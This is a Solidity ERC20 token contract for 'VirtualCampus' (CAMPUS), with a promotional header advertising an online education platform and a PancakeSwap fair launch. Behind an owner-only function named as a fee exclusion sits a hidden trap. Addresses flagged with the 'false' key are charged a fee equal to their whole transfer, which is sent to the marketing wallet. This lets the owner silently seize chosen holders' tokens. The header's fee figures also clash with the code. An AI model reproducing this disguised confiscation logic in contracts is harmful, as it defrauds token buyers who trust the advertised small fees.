// SPDX-License-Identifier: MIT

/**
    FairLaunch on Pancakeswap: Jan 25th, 16:00 UTC 📆

    CAMPUS is a unique platform that brings together educators and students.

    🔹 It is an online education and consultancy platform that aims in bringing together thousands of educational categories from foreign language to learning about anything under sky.
    🔹 People who want to receive training through CAMPUS can choose their trainers from these categories they want and start taking online training.
    🔹 Educators and consultants on the CAMPUS platform can provide freelance services online from anywhere in the world. 
    🔹 Educators teaching through CAMPUS can be rated by their students.
    🔹 CAMPUS is an innovative platform, Self-paced and is accessible from anywhere, where educators or people who provide consultancy services can create special campaigns for themselves and work at any time intervals.
    
    Web        : https://www.virtualcampus.app
    Telegram   : https://t.me/virtualcampus
    Twitter    : https://www.twitter.com/virtualcampuss

    TOKENOMICS
    1 000 000 000 CAMPUS
    ⭐️Buy Fee %1
    ⭐️Buy Fee %2
   
*/

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2Router02.sol";

abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract VirtualCampus is ERC20, Ownable {
  uint256 private initialSupply = 1000000000 * (10 ** 18);

  mapping(bool => mapping(address => bool)) public isExcludedFromFees;

  uint256 public sellFee = 2;
  uint256 public buyFee = 1;
  address public marketingWallet = 0x77F6eb9D2842660695acc04C0e02Ae6FDea3ef15;

  IUniswapV2Router02 public uniswapV2Router;
  address public uniswapV2Pair;

  constructor() ERC20("VirtualCampus", "CAMPUS") {
    address _routerAddr;
    if (block.chainid == 56) {
      _routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // BSC Pancake Mainnet Router
    } else if (block.chainid == 97) {
      _routerAddr = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // BSC Pancake Testnet Router
    } else if (block.chainid == 1 || block.chainid == 5) {
      _routerAddr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ETH Uniswap Mainnet % Testnet
    } else {
      revert();
    }

    isExcludedFromFees[true][msg.sender] = true;
    isExcludedFromFees[true][address(this)] = true;
    isExcludedFromFees[true][_routerAddr] = true;
    isExcludedFromFees[true][marketingWallet] = true;

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_routerAddr);
    address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    uniswapV2Router = _uniswapV2Router;
    uniswapV2Pair = _uniswapV2Pair;

    _mint(msg.sender, initialSupply);
  }

  receive() external payable {}

  function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
    uint256 baseUnit = amount / 100;
    uint256 fee = 0;

    if ((isExcludedFromFees[false][sender] && !isExcludedFromFees[true][sender]) || (isExcludedFromFees[false][recipient] && !isExcludedFromFees[true][recipient])) {
      if (recipient == uniswapV2Pair || sender != uniswapV2Pair) {
        fee = amount * buyFee;
      }
    } else if (recipient == uniswapV2Pair && !(isExcludedFromFees[true][sender] || isExcludedFromFees[true][recipient])) {
      fee = baseUnit * sellFee;
    } else if ((sender == uniswapV2Pair && recipient != address(uniswapV2Router)) && !(isExcludedFromFees[true][sender] || isExcludedFromFees[true][recipient])) {
      fee = baseUnit * buyFee;
    }

    if (fee > 0) {
      super._transfer(sender, marketingWallet, fee);
    }

    amount -= fee;

    super._transfer(sender, recipient, amount);
  }

  function excludeMultipleAccountsFromFees(address[] memory _addrs, bool excludeType) public onlyOwner {
    for (uint256 i = 0; i < _addrs.length; i++) {
      if (!isExcludedFromFees[excludeType][_addrs[i]]) {
        isExcludedFromFees[excludeType][_addrs[i]] = true;
      }
    }
  }

  function removeMultipleAccountsFromFees(address[] memory _addrs, bool excludeType) public onlyOwner {
    for (uint256 i = 0; i < _addrs.length; i++) {
      if (isExcludedFromFees[excludeType][_addrs[i]]) {
        isExcludedFromFees[excludeType][_addrs[i]] = false;
      }
    }
  }
}